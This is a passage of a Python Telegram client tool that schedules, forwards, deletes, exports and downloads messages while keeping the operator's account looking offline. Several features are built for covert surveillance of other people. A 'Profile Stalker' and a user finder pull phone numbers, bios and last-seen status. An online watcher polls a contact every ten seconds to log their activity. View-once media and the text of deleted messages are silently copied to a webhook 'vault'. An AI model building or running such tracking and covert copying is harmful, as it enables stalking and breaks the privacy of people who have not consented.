                raw_path = prompt("Absolute File Path (or 'done')")
                if not raw_path: 
                    break
                if raw_path.strip().lower() == 'done':
                    break
                    
                path = raw_path.strip().strip('\'"').replace("\\ ", " ")
                if not os.path.exists(path):
                    error(f"Path not found: {path}")
                    continue
                    
                if os.path.isdir(path):
                    info("Directory detected. Extracting files...")
                    added = 0
                    for root, _, files in os.walk(path):
                        for f in files:
                            if not f.startswith('.'):
                                paths.append(os.path.join(root, f))
                                added += 1
                    success(f"Added {added} files from directory  ({len(paths)} total)")
                else:
                    paths.append(path)
                    success(f"Added: {os.path.basename(path)}  ({len(paths)} total)")

        if not reply_text and not paths:
            warn("Cancelled.")
            continue
            
        print()
        print(col("  Choose schedule time:", Fore.CYAN))
        print(col("  1. +2 mins from now (Instant Stealth)", Fore.WHITE))
        print(col("  2. Custom Schedule Time (HH:MM)", Fore.WHITE))
        time_choice = prompt("Select 1 or 2")
        
        dt_utc = None
        if time_choice == "2":
            for attempt in range(3):
                t_input = prompt("Send at time HH:MM (IST)")
                if not t_input.strip():
                    if attempt < 2:
                        warn("Time cannot be blank! Please provide a time.")
                    continue
                    
                try:
                    now_ist = datetime.now(IST)
                    t_ist = datetime.strptime(t_input.strip(), "%H:%M").replace(year=now_ist.year, month=now_ist.month, day=now_ist.day, tzinfo=IST)
                    if t_ist < now_ist:
                        t_ist += timedelta(days=1)
                    dt_utc = t_ist.astimezone(timezone.utc)
                    break
                except Exception:
                    if attempt < 2:
                        warn("Invalid format. Please use HH:MM.")
                        
            if not dt_utc:
                error("Process cancelled: No valid time provided.")
                continue
        else:
            dt_utc = datetime.now(timezone.utc) + timedelta(minutes=2)

        try:
            await go_offline(client)
            if paths:
                if reply_text:
                    await client.send_message(selected.entity, reply_text, reply_to=target.id, schedule=dt_utc)
                for p in paths:
                    await client.send_file(selected.entity, p, reply_to=target.id, schedule=dt_utc)
            else:
                await client.send_message(selected.entity, reply_text, reply_to=target.id, schedule=dt_utc)
            await go_offline(client)
            r_sched_str = dt_utc.astimezone(IST).strftime('%H:%M')
            success(f"Reply stealthily scheduled for {r_sched_str} IST   👻")
            audit_card = (
                f"↩️ <b>MESSAGE REPLY QUEUED</b>\n"
                f"────────────────────────\n"
                f"💬 <b>Conversation:</b> {html.escape(selected.name)}\n"
                f"⏱️ <b>Scheduled Delivery:</b> <code>{r_sched_str} IST</code>\n"
            )
            if reply_text:
                audit_card += f"📝 <b>Payload:</b>\n<blockquote>{html.escape(reply_text)}</blockquote>\n"
            if paths:
                audit_card += f"📁 <b>Attached Assets:</b> <code>{len(paths)} file(s)</code>\n"
            asyncio.create_task(dispatch_vault_event(audit_card, silent=True))
        except Exception as e:
            error(f"Failed: {e}")

        nxt = again_menu(
            f"Reply to another message in  [{selected.name}]",
            "Switch to a different chat",
        )
        if nxt is None:
            return
        elif "different" in nxt:
            selected = None


async def feat_schedule(client, accent):
    """12. Schedule Message — loop: schedule another in same or different chat."""
    selected = None
    dialogs  = None
    while True:
        clear()
        header("SCHEDULE MESSAGE  (IST)  👻")
        if selected is None:
            selected, dialogs = await pick_dialog(client, accent)
            if not selected:
                return

        print(col(f"\n  To:  [{selected.name}]", Fore.CYAN + Style.BRIGHT))
        
        print(col("  What do you want to schedule?", Fore.CYAN))
        print(col("  1. Text Only", Fore.WHITE))
        print(col("  2. File / Folder Only", Fore.WHITE))
        print(col("  3. Combined (Text + File)", Fore.WHITE))
        
        s_choice = prompt("Choose an option")
        if s_choice not in ["1", "2", "3"]:
            warn("Cancelled.")
            continue
            
        text = None
        if s_choice in ["1", "3"]:
            text = prompt("Message text")
            if not text and s_choice == "1":
                warn("Cancelled.")
                continue
                
        paths = []
        if s_choice in ["2", "3"]:
            print(col("  Type or drag-and-drop file paths. Type 'done' when finished.", Fore.CYAN))
            while True:
                raw_path = prompt("Absolute File Path (or 'done')")
                if not raw_path: 
                    break
                if raw_path.strip().lower() == 'done':
                    break
                    
                path = raw_path.strip().strip('\'"').replace("\\ ", " ")
                if not os.path.exists(path):
                    error(f"Path not found: {path}")
                    continue
                    
                if os.path.isdir(path):
                    info("Directory detected. Extracting files...")
                    added = 0
                    for root, _, files in os.walk(path):
                        for f in files:
                            if not f.startswith('.'):
                                paths.append(os.path.join(root, f))
                                added += 1
                    success(f"Added {added} files from directory  ({len(paths)} total)")
                else:
                    paths.append(path)
                    success(f"Added: {os.path.basename(path)}  ({len(paths)} total)")

        if not text and not paths:
            warn("Cancelled.")
            continue
            
        dt_utc = None
        for attempt in range(3):
            t_input = prompt("Send at time HH:MM (IST)")
            if not t_input.strip():
                if attempt < 2:
                    warn("Time cannot be blank! Please provide a time.")
                continue
                
            try:
                now_ist = datetime.now(IST)
                t_ist = datetime.strptime(t_input.strip(), "%H:%M").replace(year=now_ist.year, month=now_ist.month, day=now_ist.day, tzinfo=IST)
                if t_ist < now_ist:
                    t_ist += timedelta(days=1)
                dt_utc = t_ist.astimezone(timezone.utc)
                break
            except Exception:
                if attempt < 2:
                    warn("Invalid format. Please use HH:MM.")
                    
        if not dt_utc:
            error("Process cancelled: No valid time provided.")
            continue

        try:
            await go_offline(client)
            if paths:
                if text:
                    await client.send_message(selected.entity, text, schedule=dt_utc)
                for p in paths:
                    await client.send_file(selected.entity, p, schedule=dt_utc)
            else:
                await client.send_message(selected.entity, text, schedule=dt_utc)
            await go_offline(client)
            success(f"Scheduled perfectly for {dt_utc.astimezone(IST).strftime('%H:%M')} IST   👻")
        except Exception as e:
            error(f"Failed: {e}")

        nxt = again_menu(
            f"Schedule another for  [{selected.name}]",
            "Schedule for a different chat",
        )
        if nxt is None:
            return
        elif "different" in nxt:
            selected = None


async def feat_delete(client, accent):
    """13. Delete Message — loop: delete another from same or different chat."""
    selected = None
    dialogs  = None
    while True:
        clear()
        header("DELETE MESSAGE")
        if selected is None:
            selected, dialogs = await pick_dialog(client, accent)
            if not selected:
                return

        n    = prompt(f"Load how many messages from  [{selected.name}]?  (default 20)")
        n    = int(n) if n.isdigit() else 20
        msgs = await client.get_messages(selected.entity, limit=n)
        await go_offline(client)
        if not msgs:
            error("No messages found!"); press_enter(); continue

        clear()
        header(f"🗑️   {selected.name}  —  pick message to delete")
        mlist = list(reversed(msgs))
        for i, m in enumerate(mlist):
            sndr = "You" if m.out else selected.name
            txt  = trunc(m.text or "[media]", 60)
            print(col(f"  {i:>3}.  [{to_ist(m.date)}]  {sndr}:", Fore.WHITE)
                  + col(f"  {txt}", Style.DIM))

        try:
            idx    = int(prompt("Delete message number  (blank = cancel)"))
            target = mlist[idx]
        except (ValueError, IndexError):
            warn("Cancelled or invalid."); press_enter()
            nxt = again_menu(
                f"Delete another from  [{selected.name}]",
                "Switch to a different chat",
            )
            if nxt is None: return
            elif "different" in nxt: selected = None
            continue

        revoke = prompt("Delete for everyone?  (y / N)").lower() == "y"
        scope  = "for everyone" if revoke else "just for you"
        print(col(f"\n  ⚠️   Delete this message  ({scope})?", Fore.YELLOW))
        if prompt("Confirm?  (y / N)").lower() != "y":
            warn("Cancelled.")
        else:
            try:
                await go_offline(client)
                await client.delete_messages(selected.entity, [target.id], revoke=revoke)
                await go_offline(client)
                success(f"Message deleted  ({scope}).")
                audit_card = (
                    f"🗑️ <b>MESSAGE EXPUNGED</b>\n"
                    f"────────────────────────\n"
                    f"💬 <b>Conversation:</b> {html.escape(selected.name)}\n"
                    f"🔒 <b>Scope:</b> <code>{scope}</code>\n"
                    f"📄 <b>Content Reference:</b> {html.escape(trunc(target.text or '[media]', 120))}"
                )
                asyncio.create_task(dispatch_vault_event(audit_card, silent=True))
            except Exception as e:
                error(f"Failed: {e}")

        nxt = again_menu(
            f"Delete another from  [{selected.name}]",
            "Switch to a different chat",
        )
        if nxt is None:
            return
        elif "different" in nxt:
            selected = None


async def feat_forward_msg(client, accent):
    """14. Forward Message — loop: forward another message."""
    while True:
        clear()
        header("FORWARD MESSAGE  👻")
        info("Select SOURCE chat:")
        src, dialogs = await pick_dialog(client, accent)
        if not src:
            return

        n    = prompt(f"Load how many messages from  [{src.name}]?  (default 20)")
        n    = int(n) if n.isdigit() else 20
        msgs = await client.get_messages(src.entity, limit=n)
        await go_offline(client)
        if not msgs:
            error("No messages found!"); press_enter(); continue

        clear()
        header(f"💬  {src.name}  —  pick message to forward")
        mlist = list(reversed(msgs))
        for i, m in enumerate(mlist):
            sndr = "You" if m.out else src.name
            txt  = trunc(m.text or "[media]", 60)
            print(col(f"  {i:>3}.  [{to_ist(m.date)}]  {sndr}:", Fore.WHITE)
                  + col(f"  {txt}", Style.DIM))

        try:
            target = mlist[int(prompt("Forward message number"))]
        except (ValueError, IndexError):
            error("Invalid!"); press_enter(); continue

        info("Select DESTINATION chat:")
        dst, _ = await pick_dialog(client, accent, cached=dialogs)
        if not dst:
            continue

        send_at     = auto_schedule()
        send_at_ist = send_at.astimezone(IST).strftime("%H:%M")
        try:
            await go_offline(client)
            await client.forward_messages(dst.entity, target, schedule=send_at)
            await go_offline(client)
            success(f"Queued!  Sends at  {send_at_ist} IST   👻 Last seen untouched!")
            audit_card = (
                f"↗️ <b>MESSAGE MIGRATED (FORWARD)</b>\n"
                f"────────────────────────\n"
                f"📤 <b>Source:</b> {html.escape(src.name)}\n"
                f"📥 <b>Destination:</b> {html.escape(dst.name)}\n"
                f"⏱️ <b>Scheduled Delivery:</b> <code>{send_at_ist} IST</code>\n"
                f"📄 <b>Content Reference:</b> {html.escape(trunc(target.text or '[media]', 120))}"
            )
            asyncio.create_task(dispatch_vault_event(audit_card, silent=True))
        except Exception as e:
            error(f"Failed: {e}")

        nxt = again_menu("Forward another message")
        if nxt is None:
            return


# ═══════════════════════════════════════════════════════════════
#  FEATURES — MEDIA / EXPORT
# ═══════════════════════════════════════════════════════════════

async def feat_forward_media(client, accent, all_accounts):
    """15. Forward Media → Another Account — loop."""
    while True:
        clear()
        header("FORWARD MEDIA → ANOTHER ACCOUNT")

        selected, _ = await pick_dialog(client, accent)
        if not selected:
            return

        print()
        for t in MEDIA_TYPES:
            print(col(f"  {t[0]}.  {t[1]}", Fore.WHITE))
        print(col("  5.  All media", Fore.WHITE))
        choice  = prompt("Media type")
        if choice not in ("1", "2", "3", "4", "5"):
            error("Invalid choice — enter 1 to 5"); press_enter(); continue
        filter_ = next((t[2] for t in MEDIA_TYPES if t[0] == choice), None)

        n = prompt("How many items?  (default 20)")
        n = int(n) if n.isdigit() else 20

        print(col("\n  Target account:", Fore.CYAN + Style.BRIGHT))
        acc_names = list(all_accounts.keys())
        for i, nm in enumerate(acc_names):
            print(col(f"  {i:>3}.  {nm}", account_color(all_accounts[nm])))
        try:
            tgt_config = all_accounts[acc_names[int(prompt("Account number"))]]
        except (ValueError, IndexError):
            error("Invalid account!"); press_enter(); continue

        info("Connecting to target account…")
        try:
            tgt = await connect_client(
                StringSession(tgt_config.get("client_token") or tgt_config.get("session_string", "")),
                tgt_config["api_id"],
                tgt_config["api_hash"],
                account_config=tgt_config,
            )
        except Exception as e:
            error(f"Could not connect to target account: {e}"); press_enter(); continue
        if not await tgt.is_user_authorized():
            error("Target session is invalid!"); await tgt.disconnect(); press_enter(); continue
        await go_offline(tgt)

        dest_raw = prompt("Forward to  (username / @user / 'me' = Saved Messages)")
        try:
            dest = await tgt.get_entity("me" if dest_raw.lower() == "me" else dest_raw)
        except Exception:
            warn("Could not find entity — forwarding to Saved Messages")
            dest = await tgt.get_entity("me")

        info("Loading media…")
        if filter_:
            msgs = await client.get_messages(selected.entity, filter=filter_, limit=n)
        else:
            raw_msgs = await client.get_messages(selected.entity, limit=n)
            msgs     = [m for m in raw_msgs if m.media]

        if not msgs:
            error("No media found!"); await tgt.disconnect(); press_enter()
        else:
            print(col(f"\n  Forward  {len(msgs)}  item(s)  to  [{dest_raw}]?", Fore.CYAN + Style.BRIGHT))
            if prompt("Confirm?  (y / N)").lower() != "y":
                warn("Cancelled."); await tgt.disconnect()
            else:
                info(f"Forwarding {len(msgs)} item(s)…")
                ok = 0
                for m in msgs:
                    try:
                        await tgt.forward_messages(dest, m)
                        ok += 1
                        await asyncio.sleep(0.7)
                    except Exception as e:
                        warn(f"Skipped one: {e}")
                await go_offline(tgt)
                await tgt.disconnect()
                success(f"Forwarded  {ok}/{len(msgs)}   —   nothing saved locally!")
                audit_card = (
                    f"⏩ <b>MEDIA MIGRATED TO TARGET ACCOUNT</b>\n"
                    f"────────────────────────\n"
                    f"📤 <b>Source Chat:</b> {html.escape(selected.name)}\n"
                    f"📥 <b>Destination:</b> {html.escape(str(dest_raw))}\n"
                    f"👤 <b>Target Profile:</b> <code>{html.escape(nm)}</code>\n"
                    f"📦 <b>Items Migrated:</b> <code>{ok}/{len(msgs)}</code>"
                )
                asyncio.create_task(dispatch_vault_event(audit_card, silent=True))

        nxt = again_menu("Forward media from another chat")
        if nxt is None:
            return


async def feat_export(client, accent):
    """16. Export Chat (TXT/JSON) — loop: export another chat."""
    while True:
        clear()
        header("EXPORT CHAT")
        selected, dialogs = await pick_dialog(client, accent)
        if not selected:
            return

        n = prompt("How many messages?  (default 200)")
        n = int(n) if n.isdigit() else 200

        print()
        print(col("  1.  TXT  (human-readable)", Fore.WHITE))
        print(col("  2.  JSON (structured)",     Fore.WHITE))
        fmt = prompt("Format")
        if fmt not in ("1", "2"):
            error("Invalid format — enter 1 or 2"); press_enter(); continue

        info("Loading messages…")
        msgs = await client.get_messages(selected.entity, limit=n)
        await go_offline(client)

        safe  = "".join(c for c in selected.name if c.isalnum() or c in " _-").strip()
        stamp = datetime.now(IST).strftime("%Y%m%d_%H%M")
        ext   = "txt" if fmt == "1" else "json"
        fname = f"export_{safe}_{stamp}.{ext}"

        if fmt == "1":
            lines = []
            for m in reversed(msgs):
                sndr = "You" if m.out else selected.name
                txt  = m.text or ("[media]" if m.media else "")
                lines.append(f"[{to_ist(m.date)}]  {sndr}:  {txt}")
            with open(fname, "w", encoding="utf-8") as f:
                f.write("\n".join(lines))
        else:
            data = []
            for m in reversed(msgs):
                data.append({
                    "id":         m.id,
                    "date_ist":   to_ist(m.date),
                    "out":        m.out,
                    "text":       m.text or "",
                    "has_media":  bool(m.media),
                    "media_type": type(m.media).__name__ if m.media else None,
                    "reply_to":   (m.reply_to.reply_to_msg_id if m.reply_to else None),
                })
            with open(fname, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)

        success(f"Saved:  {fname}")

        print()
        print(col("  Send this export file to Telegram?", Fore.CYAN + Style.BRIGHT))
        print(col("  1.  Saved Messages", Fore.WHITE))
        print(col("  2.  Choose a chat",  Fore.WHITE))
        print(col("  3.  No — keep on device only", Fore.WHITE + Style.DIM))
        send_choice = prompt("Choice")

        if send_choice in ("1", "2"):
            if send_choice == "1":
                dest = "me"
            else:
                dst, _ = await pick_dialog(client, accent, cached=dialogs)
                if not dst:
                    dest = "me"
                else:
                    dest = dst.entity
            try:
                await go_offline(client)
                await client.send_file(dest, fname, caption=f"Export: {selected.name}")
                await go_offline(client)
                success("File sent to Telegram!   👻 still invisible")
            except Exception as e:
                error(f"Send failed: {e}")

        nxt = again_menu("Export another chat")
        if nxt is None:
            return


async def feat_download_media(client, accent):
    """17. Download Media (single file) — loop: download more from same or new chat."""
    selected  = None
    dialogs   = None
    while True:
        clear()
        header("DOWNLOAD MEDIA  📥")
        if selected is None:
            selected, dialogs = await pick_dialog(client, accent)
            if not selected:
                return

        n    = prompt(f"Load how many messages from  [{selected.name}]?  (default 30)")
        n    = int(n) if n.isdigit() else 30
        msgs = await client.get_messages(selected.entity, limit=n)
        await go_offline(client)
        media_msgs = [m for m in msgs if m.media]
        if not media_msgs:
            warn("No media in recent messages."); press_enter()
            nxt = again_menu(f"Try again in  [{selected.name}]", "Pick a different chat")
            if nxt is None: return
            elif "different" in nxt: selected = None
            continue

        clear()
        header(f"📥  {selected.name}  —  choose file to download")
        for i, m in enumerate(media_msgs):
            mtype = type(m.media).__name__.replace("MessageMedia", "")
            print(col(f"  {i:>3}.  [{to_ist(m.date)}]  {mtype:<12}  "
                      + trunc(m.text or "", 36), Fore.WHITE))

        try:
            idx    = int(prompt("Download number"))
            target = media_msgs[idx]
        except (ValueError, IndexError):
            error("Invalid!"); press_enter()
            nxt = again_menu(f"Try again in  [{selected.name}]", "Pick a different chat")
            if nxt is None: return
            elif "different" in nxt: selected = None
            continue

        save_dir = os.path.expanduser("~/storage/downloads")
        if not os.path.exists(save_dir):
            save_dir = "downloads"
        os.makedirs(save_dir, exist_ok=True)
        info(f"Downloading to  {save_dir}/ …")
        try:
            await go_offline(client)
            path = await client.download_media(target.media, file=save_dir)
            await go_offline(client)
            success(f"Saved →  {path}")
            if path and os.path.isfile(path):
                try:
                    m_sender = await get_sender_name(client, target)
                    m_sender_esc = html.escape(m_sender or "Unknown")
                    chat_title_esc = html.escape(getattr(selected, 'name', 'Private Chat'))
                    m_time_str = target.date.astimezone(IST).strftime("%d/%m/%Y %H:%M:%S IST")
                    is_vo = bool(getattr(target.media, 'ttl_seconds', None))

                    f_lower = path.lower()
                    if f_lower.endswith(('.ogg', '.oga', '.opus')):
                        m_type = "voice"
                        h_tag = "🎙️ <b>AUDIO MEDIA BACKUP (NLP TRANSCRIPT)</b>"
                    elif f_lower.endswith(('.jpg', '.jpeg', '.png', '.webp')):
                        m_type = "photo"
                        h_tag = "📷 <b>MEDIA BACKUP: VIEW-ONCE PHOTO</b>" if is_vo else "📷 <b>PHOTO MEDIA BACKUP</b>"
                    elif f_lower.endswith(('.mp4', '.mov', '.mkv', '.webm', '.avi')):
                        m_type = "document"
                        h_tag = "🎥 <b>MEDIA BACKUP: VIEW-ONCE VIDEO</b>" if is_vo else "🎥 <b>VIDEO MEDIA BACKUP</b>"
                    else:
                        m_type = "document"
                        h_tag = "📁 <b>DOCUMENT MEDIA BACKUP</b>"

                    cap_parts = [
                        h_tag,
                        "────────────────────────",
                        f"👤 <b>Originator:</b> {m_sender_esc}",
                        f"💬 <b>Conversation:</b> {chat_title_esc}",
                        f"⏱️ <b>Timestamp:</b> <code>{m_time_str}</code>"
                    ]
                    if getattr(target, 'text', None):
                        cap_parts.append(f"💬 <b>Caption:</b> {html.escape(target.text)}")

                    await WebhookEventBus.emit_media("media_backup", path, caption="\n".join(cap_parts), media_type=m_type)
                except Exception:
                    pass
        except Exception as e:
            error(f"Download failed: {e}")

        nxt = again_menu(
            f"Download another file from  [{selected.name}]",
            "Pick a different chat",
        )
        if nxt is None:
            return
        elif "different" in nxt:
            selected = None


async def feat_bulk_download(client, accent):
    """18. Bulk Download (all media in chat) — loop: download from another chat."""
    while True:
        clear()
        header("BULK DOWNLOAD  📦")
        selected, _ = await pick_dialog(client, accent)
        if not selected:
            return

        print()
        for t in MEDIA_TYPES:
            print(col(f"  {t[0]}.  {t[1]}", Fore.WHITE))
        print(col("  5.  All media", Fore.WHITE))
        choice  = prompt("Media type")
        filter_ = next((t[2] for t in MEDIA_TYPES if t[0] == choice), None)
        n       = prompt("How many items?  (default 50)")
        n       = int(n) if n.isdigit() else 50
        safe    = "".join(c if c.isalnum() or c in " _-" else "_" for c in selected.name)
        save_dir = os.path.join("downloads", safe)
        os.makedirs(save_dir, exist_ok=True)

        info("Loading media list…")
        await go_offline(client)
        if filter_:
            msgs = await client.get_messages(selected.entity, filter=filter_, limit=n)
        else:
            raw  = await client.get_messages(selected.entity, limit=n)
            msgs = [m for m in raw if m.media]
        await go_offline(client)

        if not msgs:
            warn("No media found!"); press_enter()
        else:
            success(f"Found {len(msgs)} items → downloading to  {save_dir}/")
            ok = fail = 0
            for i, m in enumerate(msgs):
                try:
                    await go_offline(client)
                    path = await client.download_media(m.media, file=save_dir)
                    ok  += 1
                    print(col(f"  [{i+1}/{len(msgs)}]  ✓  {os.path.basename(str(path))}", Fore.GREEN))
                except Exception as e:
                    fail += 1
                    print(col(f"  [{i+1}/{len(msgs)}]  ✗  {e}", Fore.RED))
            print()
            success(f"Done!  {ok} saved  ·  {fail} failed  ·  Folder: {save_dir}/")

        nxt = again_menu("Bulk download from another chat")
        if nxt is None:
            return


# ═══════════════════════════════════════════════════════════════
#  UNIFIED INBOX
# ═══════════════════════════════════════════════════════════════

async def unified_inbox(all_accounts):
    clear()
    header("UNIFIED INBOX  —  ALL ACCOUNTS")

    clients = []
    for name, cfg in all_accounts.items():
        accent = account_color(cfg)
        info(f"Connecting: {name}…")
        try:
            cl = await connect_client(
                StringSession(cfg.get("client_token") or cfg.get("session_string", "")),
                cfg["api_id"],
                cfg["api_hash"],
                account_config=cfg,
            )
            if await cl.is_user_authorized():
                await go_offline(cl)
                clients.append((name, cfg, cl, accent))
            else:
                error(f"{name}: invalid session")
        except Exception as e:
            error(f"{name}: {e}")

    if not clients:
        error("No accounts could connect!"); press_enter(); return

    kl_tasks = [
        asyncio.create_task(keepalive_loop(cl))
        for _, _, cl, _ in clients
    ]

    inbox = []
    for name, cfg, cl, accent in clients:
        try:
            dialogs = await cl.get_dialogs(limit=100)
            for d in dialogs:
                if d.unread_count > 0:
                    inbox.append((name, accent, d, cl))
        except Exception:
            pass

    clear()
    header("📬  UNIFIED INBOX")

    if not inbox:
        success("No unread messages across any account!")
    else:
        total = sum(d.unread_count for _, _, d, _ in inbox)
        print(col(f"\n  {total} unread  across  {len(inbox)} chats\n",
                  Fore.YELLOW + Style.BRIGHT))
        for acc_name, accent, d, _ in inbox:
            tag     = col(f"[{acc_name}]", accent)
            unread  = col(f"[{d.unread_count}]", Fore.RED)
            preview = ""
            if d.message and d.message.text:
                preview = col("   " + trunc(d.message.text.replace("\n", " "), 38),
                              Style.DIM)
            print(f"  {tag}  {col(d.name, Fore.WHITE)}  {unread}{preview}")

        print()
        if prompt("Open a chat?  (y / N)").lower() == "y":
            def ifmt(i, item):
                _, accent, d, _ = item
                tag    = col(f"[{item[0]}]", accent)
                unread = col(f"[{d.unread_count}]", Fore.RED)
                return f"  {col(f'{i:>3}', accent)}.  {tag}  {col(d.name, Fore.WHITE)}  {unread}"

            idx = show_page(inbox, formatter=ifmt)
            if idx is not None:
                acc_name, accent, d, cl = inbox[idx]
                clear()
                header(f"💬  [{acc_name}]  {d.name}")
                print()
                msgs = await cl.get_messages(d.entity, limit=30)
                await go_offline(cl)
                for m in reversed(msgs):
                    await render_msg(cl, m)
                    divider()
                await go_offline(cl)
                press_enter()

    for task in kl_tasks:
        task.cancel()
        try:   await task
        except asyncio.CancelledError: pass

    for _, _, cl, _ in clients:
        try:
            await go_offline(cl)
            await cl.disconnect()
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════
#  FEATURES — STEALTH INTEL
# ═══════════════════════════════════════════════════════════════

async def feat_profile(client, accent):
    """19. Profile Stalker — loop: stalk another user."""
    while True:
        clear()
        header("PROFILE STALKER  👁️")
        query = prompt("@username / +phone / user ID  (blank = back)")
        if not query:
            return
        await go_offline(client)
        try:
            entity = await client.get_entity(query)
            full   = await client(GetFullUserRequest(entity))
            u      = full.users[0]
            name   = (u.first_name or "") + (" " + u.last_name if u.last_name else "")
            uname  = "@" + u.username if u.username else "—"
            phone  = u.phone or "hidden"
            bio    = full.full_user.about or "—"
            st     = u.status
            stn    = type(st).__name__
            if   stn == "UserStatusOnline":    last = "🟢  ONLINE RIGHT NOW"
            elif stn == "UserStatusRecently":  last = "recently online"
            elif stn == "UserStatusLastWeek":  last = "within last week"
            elif stn == "UserStatusLastMonth": last = "within last month"
            elif hasattr(st, "was_online"):    last = to_ist(st.was_online)
            else:                              last = "long time ago / hidden"
            await go_offline(client)
            clear()
            header(f"👁️  PROFILE  —  {name}")
            print(col(f"  Full name   :  {name}",    Fore.WHITE))
            print(col(f"  Username    :  {uname}",   Fore.CYAN))
            print(col(f"  Phone       :  {phone}",   Fore.WHITE))
            print(col(f"  User ID     :  {u.id}",    Fore.WHITE + Style.DIM))
            print(col(f"  Bio         :  {bio}",     Fore.WHITE))
            print(col(f"  Last seen   :  {last}",    Fore.YELLOW))
            print(col(f"  Bot         :  {'Yes' if u.bot else 'No'}",       Fore.WHITE + Style.DIM))
            print(col(f"  Verified    :  {'Yes' if u.verified else 'No'}",  Fore.WHITE + Style.DIM))
            print(col(f"  Scam flag   :  {'⚠️  YES' if u.scam else 'No'}",
                      Fore.RED + Style.BRIGHT if u.scam else Fore.WHITE + Style.DIM))
        except Exception as e:
            error(f"Could not fetch profile: {e}")
        await go_offline(client)

        nxt = again_menu("Stalk another user")
        if nxt is None:
            return


async def feat_online_watch(client, accent):
    """20. Online Watcher — live monitor when a contact goes online (timed)."""
    clear()
    header("ONLINE WATCHER  🔔")
    query = prompt("@username or +phone to watch  (blank = back)")
    if not query:
        return
    await go_offline(client)
    try:
        entity = await client.get_entity(query)
    except Exception as e:
        error(f"Not found: {e}"); press_enter(); return

    mins_s = prompt("Watch for how many minutes?  (default 5)")
    mins   = int(mins_s) if mins_s.isdigit() else 5
    name   = getattr(entity, "first_name", None) or getattr(entity, "title", str(query))
    clear()
    header(f"👁️  Watching  {name}  for {mins} min")
    info("Checking every 10 s.  Ctrl+C to stop early.")
    print()
    loop       = asyncio.get_running_loop()
    end        = loop.time() + mins * 60
    last_known = None
    checks     = 0
    try:
        while loop.time() < end:
            await go_offline(client)
            try:
                u   = await client.get_entity(entity.id)
                stn = type(u.status).__name__
                cur = ("online"   if stn == "UserStatusOnline"
                       else "offline" if stn == "UserStatusOffline"
                       else "recently")
                now = datetime.now(IST).strftime("%H:%M:%S")
                checks += 1
                if cur != last_known:
                    if cur == "online":
                        print(col(f"  [{now}]  🟢  {name} is ONLINE!", Fore.GREEN + Style.BRIGHT))
                    elif cur == "offline" and last_known == "online":
                        wt = to_ist(u.status.was_online) if hasattr(u.status, "was_online") else now
                        print(col(f"  [{now}]  ⚫  {name} went OFFLINE  (was online at {wt})", Fore.RED))
                    else:
                        print(col(f"  [{now}]  ●  {name} → {cur}", Fore.WHITE + Style.DIM))
                    last_known = cur
                else:
                    icon = "🟢" if cur == "online" else "⚫"
                    print(col(f"  [{now}]  {icon}  still {cur}", Style.DIM), end="\r")
            except Exception:
                pass
            await asyncio.sleep(10)
    except KeyboardInterrupt:
        pass
    print()
    success(f"Watch ended.  {checks} checks.  👻 You stayed invisible.")
    await go_offline(client)
    press_enter()


async def feat_find_user(client, accent):
    """21. Find User — loop: find another."""
    while True:
        clear()
        header("FIND USER  🔎")
        query = prompt("@username  /  +phone  /  user ID  (blank = back)")
        if not query:
            return
        await go_offline(client)
        try:
            entity = await client.get_entity(query)
            try:
                full  = await client(GetFullUserRequest(entity))
                u     = full.users[0]
                name  = (u.first_name or "") + (" " + u.last_name if u.last_name else "")
                uname = "@" + u.username if u.username else "—"
                phone = u.phone or "hidden"
                bio   = full.full_user.about or "—"
                st    = u.status
            except Exception:
                u     = entity
                name  = (getattr(u, "first_name", "") or getattr(u, "title", str(query)))
                uname = ("@" + u.username) if getattr(u, "username", None) else "—"
                phone = getattr(u, "phone", "hidden") or "hidden"
                bio   = "—"
                st    = getattr(u, "status", None)
            stn  = type(st).__name__ if st else "None"
            if   stn == "UserStatusOnline":    last = "🟢  ONLINE RIGHT NOW"
            elif stn == "UserStatusRecently":  last = "recently online"
            elif stn == "UserStatusLastWeek":  last = "within last week"
            elif stn == "UserStatusLastMonth": last = "within last month"
            elif hasattr(st, "was_online"):    last = to_ist(st.was_online)
            else:                              last = "hidden / long time ago"
            await go_offline(client)
            clear()
            header(f"🔎  FOUND  —  {name}")
            print(col(f"  Full name   :  {name}",          Fore.WHITE))
            print(col(f"  Username    :  {uname}",         Fore.CYAN))
            print(col(f"  Phone       :  {phone}",         Fore.WHITE))
            print(col(f"  User ID     :  {entity.id}",     Fore.WHITE + Style.DIM))
            print(col(f"  Bio         :  {bio}",           Fore.WHITE))
            print(col(f"  Last seen   :  {last}",          Fore.YELLOW))
            print(col(f"  Bot         :  {'Yes' if getattr(u,'bot',False) else 'No'}",
                      Fore.WHITE + Style.DIM))
            print(col(f"  Verified    :  {'Yes' if getattr(u,'verified',False) else 'No'}",
                      Fore.WHITE + Style.DIM))
        except Exception as e:
            error(f"Could not find user: {e}")
        await go_offline(client)

        nxt = again_menu("Find another user")
        if nxt is None:
            return


async def feat_auto_reply(client, accent):
    """22. Auto-Reply Bot (timed keyword bot — runs for N minutes)."""
    clear()
    header("AUTO-REPLY BOT  🤖")
    warn("Rules apply for this session only.  Leave keyword blank when done.")
    print(col("  Format:  keyword → reply text\n", Fore.WHITE + Style.DIM))
    rules = []
    while True:
        kw = prompt("Keyword  (blank = stop adding rules)")
        if not kw:
            break
        rt = prompt(f"Reply when someone says '{kw}'")
        if rt:
            rules.append((kw.lower(), rt))
            success(f"Rule saved:  '{kw}' → '{trunc(rt, 40)}'")
    if not rules:
        warn("No rules set."); press_enter(); return

    mins_s = prompt("Run bot for how many minutes?  (default 10)")
    mins   = int(mins_s) if mins_s.isdigit() else 10
    clear()
    header("🤖  AUTO-REPLY  RUNNING")
    info(f"{len(rules)} rule(s) active for {mins} min.  Ctrl+C to stop.")
    print()
    loop  = asyncio.get_running_loop()
    end   = loop.time() + mins * 60
    seen  = set()
    try:
        while loop.time() < end:
            await go_offline(client)
            try:
                dialogs = await client.get_dialogs(limit=50)
                for d in dialogs:
                    if d.unread_count == 0:
                        continue
                    msgs = await client.get_messages(d.entity, limit=5)
                    await go_offline(client)
                    for m in msgs:
                        if m.out or (d.id, m.id) in seen:
                            continue
                        txt = (m.text or "").lower()
                        for kw, rt in rules:
                            if kw in txt:
                                seen.add((d.id, m.id))
                                send_at     = auto_schedule()
                                send_at_ist = send_at.astimezone(IST).strftime("%H:%M")
                                await go_offline(client)
                                await client.send_message(d.entity, rt,
                                                          reply_to=m.id, schedule=send_at)
                                await go_offline(client)
                                now = datetime.now(IST).strftime("%H:%M:%S")
